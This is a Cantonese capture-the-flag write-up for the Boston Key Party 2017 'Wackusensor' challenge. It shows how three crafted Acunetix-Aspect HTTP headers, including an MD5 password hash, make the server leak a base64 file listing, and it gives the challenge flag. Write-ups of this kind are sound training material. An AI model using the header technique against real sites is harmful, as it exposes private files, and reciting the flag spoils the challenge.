# Boston Key Party 2017: Wackusensor (Cloud, 100)

說明：
> I can't get this stupid Acusensor to work and it's driving me crazy: how can I do web stuff without automated scanners :/
>
> http://54.200.58.235/

## 簡介

呢題解完都唔知佢做乜春 (好似係)

題目就話個網主裝左個 Acusensor 但係用唔能到，叫你幫手睇下乜事。
佢又話個 Acusensor 既密碼 set 左做 bkp2017，同埋又俾埋個 acu_phpaspect.php 既 source code 你睇。

撳入去個 code 度見到成堆 variable 都係 _AAS 開頭，見到都唔開胃。
開胃 D 既有個叫 $_SERVER["HTTP_ACUNETIX_ASPECT"]，咁 Google 下乜野係 Acunetix-Aspect 就發現應該係個 scanner send 既 HTTP header：

```
Acunetix-Aspect: enabled
```

(其實你再望過少少就見到個 condition 係 $_SERVER["HTTP_ACUNETIX_ASPECT"] === "enabled")
下面有個 condition 睇 $_SERVER["HTTP_ACUNETIX_ASPECT_PASSWORD"]，又讀個 file 最尾 32 個 bytes。拉到最低見到 4faa9d4408780ae071ca2708e3f09449。

如果你食飽飯冇野做去查下個 hash 會發現 md5(bkp2017) = 4faa9d4408780ae071ca2708e3f09449。

。
```
Acunetix-Aspect-Password: 4faa9d4408780ae071ca2708e3f09449
```
最底重有個 $_SERVER["HTTP_ACUNETIX_ASPECT_QUERIES"]，又 explode 個 ; 之後又 switch case，
有兩個 case，一個叫 filelist，另一個叫 aspectalerts，睇落好似查人家宅咁，是但啦加埋佢啦……
```
Acunetix-Aspect-Queries: filelist;aspectalerts
```

掉晒呢三個 Header 去個網咁你就成功地扮緊一個 authenticated Acunetix scanner (嗱我冇錢買)。

之後你見個 html output 多左 D comment:
```
<!--BKPASPECT:MDAwMDAwMDRQQU5HbjAwMDAwMDAwMDAwMDAwMDBuMDAwMDAwMDlGaWxlX0xpc3RhMDAwMDAwMDgwMDAwMDAxNnN1cGVyX3NlY3JldF90ZW1wX2Rpci8wMDAwMDAzRHN1cGVyX3NlY3JldF90ZW1wX2Rpci9fQUFTMTY3MDA2ODQzMjNkY2IxMDVjYWU3MWQwMDU3MTUxZDllMWMwMDAwMDAzRHN1cGVyX3NlY3JldF90ZW1wX2Rpci9fQUFTMTY3YTg3NTZlZmExYzY1YTYzNzRmMTM5Y2NhYjI4ZDY4ZTQwMDAwMDAwQmZhdmljb24ucG5nMDAwMDAwM0NzdXBlcl9zZWNyZXRfZmlsZV9jb250YWluaW5nX3RoZV9mbGFnX3lvdV9zaG91bGRfcmVhZF9pdC5waHAwMDAwMDAwOWluZGV4LnBocDAwMDAwMDExYWN1X3BocGFzcGVjdC50eHQwMDAwMDAwOXN0eWxlLmNzczAwMDAwMDE3L3Zhci93d3cvaHRtbC9pbmRleC5waHAwMDAwMDAwMG4wMDAwMDAwREFzcGVjdF9BbGVydHNhMDAwMDAwMDMwMDAwMDAxMW1hZ2ljX2dwY19vZmY9b2ZmMDAwMDAwMTVhbGxvd191cmxfZm9wZW5fb249T24wMDAwMDAyM3BocF92ZXJzaW9uPTcuMC4xNS0wdWJ1bnR1MC4xNi4wNC4yMDAwMDAwMTcvdmFyL3d3dy9odG1sL2luZGV4LnBocDAwMDAwMDAwbg==-->
```
ACUASPECT 變左 BKPASPECT 囉。明眼人一睇就知係 base64 encode

解左佢就見到咩 super_secret_temp_dir 啊 super_secret_temp_dir/_AAS16700684323dcb105cae71d0057151d9e1c 啊 super_secret_temp_dir/_AAS167a8756efa1c65a6374f139ccab28d68e4 啊同埋 super_secret_file_containing_the_flag_you_should_read_it.php

睇見咩 super_secret 都知唔方係好野。第二個 file _AAS16700684323dcb105cae71d0057151d9e1c 正正就係 第四個 file 既 source code，入面有
```
<?php $flag = 'BKP{What_about_writing_a_Burp_extension_for_this_N0w?}'; ?>
```

Burp 我都冇錢買啊吊。
